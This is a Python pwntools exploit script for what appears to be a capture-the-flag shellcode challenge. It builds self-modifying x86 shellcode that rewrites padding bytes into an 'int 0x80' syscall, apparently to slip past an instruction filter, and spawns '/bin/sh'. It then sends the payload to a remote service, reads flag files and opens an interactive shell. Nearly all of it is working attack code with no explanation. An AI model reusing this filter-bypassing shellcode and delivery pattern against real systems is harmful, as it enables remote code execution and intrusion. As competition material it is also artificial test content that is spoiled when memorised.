#!/usr/bin/env python3
from pwn import *

# Craft shellcode manually in hex
# Base address after prepended "mov esp, 0x6767000"
base = 0x1337005

# We'll put "inc eax; inc eax" (0x40 0x40) at offset 80
# Then modify them to "int 0x80" (0xcd 0x80)
int_offset = 80
int_addr = base + int_offset

sc = b""

# Part 1: Modify the two bytes to create "int 0x80"
# Byte 1: 0x40 + 0x8d = 0xcd
# Byte 2: 0x40 + 0x40 = 0x80

# mov eax, int_addr
sc += b"\xb8" + p32(int_addr)  # b8 XX XX XX XX

# add byte ptr [eax], 0x8d  (add 0x8d to first byte)
sc += b"\x80\x00\x8d"  # 80 00 8d

# inc eax (move to second byte)
sc += b"\x40"

# add byte ptr [eax], 0x40 (add 0x40 to second byte)
sc += b"\x80\x00\x40"  # 80 00 40

# Part 2: Set up execve("/bin/sh", NULL, NULL)
# Push "/bin/sh" onto stack
sc += b"\x68\x2f\x73\x68\x00"  # push 0x0068732f
sc += b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f

# mov ebx, esp
sc += b"\x89\xe3"

# mov eax, 11 (execve)
sc += b"\xb8\x0b\x00\x00\x00"

# mov ecx, 0
sc += b"\xb9\x00\x00\x00\x00"

# mov edx, 0
sc += b"\xba\x00\x00\x00\x00"

# Part 3: Jump to the "int 0x80" location
current_pos = base + len(sc)
jmp_offset = int_addr - (current_pos + 5)  # +5 for jmp instruction size
sc += b"\xe9" + p32(jmp_offset & 0xffffffff)  # jmp rel32

# Pad to offset 80 using "inc eax; dec eax" pairs
while len(sc) < int_offset:
    sc += b"\x40"  # inc eax
    if len(sc) < int_offset:
        sc += b"\x48"  # dec eax

# Part 4: Place "inc eax; inc eax" which will be modified to "int 0x80"
sc += b"\x40\x40"  # inc eax; inc eax -> will become int 0x80

# After the syscall, add infinite loop or exit
sc += b"\xeb\xfe"  # jmp $ (infinite loop)

print(f"Shellcode length: {len(sc)}")
print(f"Payload: {sc.hex()}")
print()

# Test locally first
test_input = sc.hex()
print("Testing locally...")
result = process(['python', 'chal.py'], stdin=PTY, stderr=PIPE)
result.sendline(test_input.encode())

try:
    out = result.recvuntil(b"bad insn", timeout=2)
    print("Validation failed:")
    print(out.decode())
    exit(1)
except:
    pass

try:
    # If no "bad insn", check for success
    result.sendline(b"cat flag")
    result.sendline(b"echo DONE")
    output = result.recvuntil(b"DONE", timeout=2)
    print("Local test output:")
    print(output.decode())
except:
    print("Local execution timed out or failed")

result.close()

# Now try remote
print("\n" + "=" * 60)
print("Connecting to remote...")
print("=" * 60)

io = remote('amt.rs', 57207)
io.sendlineafter(b'shellcode: ', test_input.encode())

# Try to interact
io.sendline(b'cat flag')
io.sendline(b'cat /srv/app/flag')
io.sendline(b'ls -la')
io.sendline(b'pwd')
io.sendline(b'echo SUCCESS')

try:
    output = io.recvuntil(b'SUCCESS', timeout=5)
    print(output.decode())
except:
    print("Timeout waiting for response")

io.interactive()
